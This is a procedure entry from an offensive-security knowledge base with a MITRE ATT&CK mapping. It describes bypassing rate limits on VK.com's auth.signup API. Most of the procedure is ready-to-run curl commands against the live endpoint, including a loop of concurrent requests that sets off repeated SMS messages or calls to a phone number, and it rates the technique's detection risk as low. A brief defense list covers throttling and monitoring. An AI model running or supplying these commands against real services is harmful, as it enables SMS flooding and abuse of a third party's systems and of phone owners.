---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - rate-limit-bypass
  - api-testing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-api-rate-limit]]'
  - '[[commands/curl-mass-request-script]]'
verified: false
platforms:
  - Web
  - API
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:10.541Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify Rate Limit Bypass in Auth Signup API

## Summary

This procedure tests the VK.com auth.signup API endpoint for missing flood control mechanisms, allowing attackers to identify and confirm the ability to bypass rate limits on SMS or call requests during user registration.

## Description

The auth.signup method is intended for user registration but lacks proper throttling, enabling repeated requests without limits. By sending multiple API calls with test phone numbers, attackers can verify that SMS verification codes or voice calls are triggered indefinitely. This was discovered through manual API testing, similar to prior vulnerabilities, and can lead to abuse if exploited further. Prerequisites include access to the public API and a test phone number.

## Requirements

1. Public internet access to VK.com API
2. A disposable test phone number for verification
3. Basic knowledge of HTTP requests (e.g., via curl)

## Defense

Defensive measures and detection strategies:

- Implement rate limiting with IP or phone-based throttling on auth.signup
- Monitor API logs for excessive requests from single sources
- Use CAPTCHA or additional verification for registration attempts

## Objectives

1. Confirm absence of flood control in auth.signup
2. Validate unlimited SMS/call triggering
3. Assess potential for escalation to abuse

## Instructions

### Step 1: Send Initial Test Request

**Context**: Probe the API with a single request to understand normal behavior and response.

**Command** ([[commands/curl-test-api-rate-limit]]):
```bash
curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131'
```

> This sends a basic registration request with a test phone. Expected output: JSON response with success or SMS trigger, no rate limit error.

### Step 2: Simulate Flood with Multiple Requests

**Context**: Rapidly send repeated requests to check for throttling enforcement.

**Command** ([[commands/curl-mass-request-script]]):
```bash
for i in {1..10}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&client_id=1&scope=notify&redirect_uri=https://oauth.vk.com/blank.html&v=5.131' & done; wait
```

> This launches 10 concurrent requests. Expected output: All requests succeed, with multiple SMS received on the test phone, confirming bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-api-rate-limit]]
- [[commands/curl-mass-request-script]]

## Tools Used


## Tags

- rate-limit-bypass
- api-testing
